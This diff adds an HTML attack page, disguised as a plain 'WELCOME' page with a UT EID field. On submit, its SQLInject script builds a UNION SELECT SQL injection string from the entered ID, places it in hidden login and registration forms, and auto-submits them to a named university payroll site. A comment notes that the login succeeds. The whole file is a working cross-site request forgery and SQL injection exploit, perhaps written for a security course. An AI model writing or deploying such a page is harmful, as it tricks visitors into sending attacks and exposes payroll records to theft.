@@ -1,0 +1,72 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <title>WELCOME</title>
+</head>
+
+<body>
+
+    <script>
+
+
+    function SQLInject () {
+        var entered = document.getElementById("eid").value;
+        var submitted = entered + "\' union select user_id, name, eid FROM users WHERE eid=\"$var_name\"--";
+
+        document.getElementById("login2").value = submitted;
+        document.getElementById("login1").value = submitted;
+
+        document.getElementById('btn2').click();
+        document.getElementById('btn1').click();
+    //window.open("http://payroll.utexas.edu/");
+
+        //window.location.assign("http://payroll.utexas.edu/");
+    //currently does not relocate to payroll site, but DOES login
+    }
+
+    </script>
+
+
+<div id="div1">
+     <form action="http://payroll.utexas.edu/" method="post" id="form1" style="display:none">
+      <fieldset>
+       <label>Login</label>
+       <input type="text" id="login1" name="login" value="">
+       <input type="text" id="pw" name="pw">
+       <div>
+        <button class="btn" type="submit" id="btn1" name="action" value="login">Log In</button>
+       </div>
+      </fieldset>
+     </form>
+ </div>
+ <div id="div2">
+     <!-- registration form -->
+     <form action="http://payroll.utexas.edu/" method="post" id="form2" style="display:none">
+      <fieldset>
+       <input style="display:none;" id="name" type="text" name="name">
+       <label>Register<br></label>
+       <input type="text" id="login2" name="login" value="">
+       <input style="display:none;" id="pw1" type="password" name="pw1">
+       <input style="display:none;" id="pw2" type="password" name="pw2">
+       <div>
+        <button class="btn" type="submit" id="btn2" name="action" value="register">Register</button>
+       </div>
+      </fieldset>
+     </form>
+ </div>
+
+     <!--visible form -->
+     <form onsubmit="SQLInject()" action = "http://payroll.utexas.edu/" method="post">
+
+      <fieldset>
+       <label>UT EID:<br></label>
+       <input type="text" id="eid" value="">
+       <div>
+        <button class="btn" type="submit" name="action" value="submit">Submit</button>
+       </div>
+      </fieldset>
+     </form>
+
+
+</body>
+</html>
